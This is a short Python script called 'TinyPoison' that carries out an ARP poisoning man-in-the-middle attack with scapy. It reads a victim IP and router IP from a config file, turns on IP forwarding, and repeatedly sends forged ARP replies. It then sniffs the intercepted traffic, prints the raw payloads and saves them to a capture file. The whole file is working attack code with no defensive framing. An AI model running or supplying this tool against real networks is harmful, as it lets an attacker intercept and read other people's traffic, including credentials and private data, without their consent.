#!/usr/bin/env python
import os, json, sys
from scapy.all import *

# Function to get MAC address from IP (duh)
def get_mac_addr(IP):
	ans, unans = arping(IP)
	for s, r in ans:
		return r[Ether].src

def spoof(router_ip_address, victim_ip_address):
	# Get MAC addresses
	victimMAC = get_mac_addr(victim_ip_address)
	routerMAC = get_mac_addr(router_ip_address)
	# Spoof the ARP things
	send(ARP(op =2, pdst = victim_ip_address, psrc = router_ip_address, hwdst = victimMAC))
	send(ARP(op = 2, pdst = router_ip_address, psrc = victim_ip_address, hwdst = routerMAC))

def undo_arp_poison(router_ip_address, victim_ip_address):
	# Reversed spoof() function
	victimMAC = get_mac_addr(victim_ip_address)
	routerMAC = get_mac_addr(router_ip_address)
	send(ARP(op = 2, pdst = router_ip_address, psrc = victim_ip_address, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4)
	send(ARP(op = 2, pdst = victim_ip_address, psrc = router_ip_address, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)

# Packet sniffer
def sniffer():
	pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
	wrpcap(output_file_name, pkts)

# Actually do the ARP poisoning
def spoof_arp():
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # Setup
	while 1:
		try:
			spoof(router_ip_address, victim_ip_address) # Poison ARP
			time.sleep(1) # Wait
			sniffer() # Sniff for packets
		except KeyboardInterrupt: # Ctrl+C
			undo_arp_poison(router_ip_address, victim_ip_address) # Cure ARP poisoning
			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward") # Undo setup
			sys.exit(1) # Exit

if __name__ == "__main__":
	print("TinyPoison 1.0")
	with open("config.json") as configfile:
		config = json.load(configfile)
	output_file_name = config["output_file_name"]
	interface = config["wireless_interface"]
	victim_ip_address = config["victim_ip"]
	router_ip_address = config["router_ip"]
	spoof_arp()
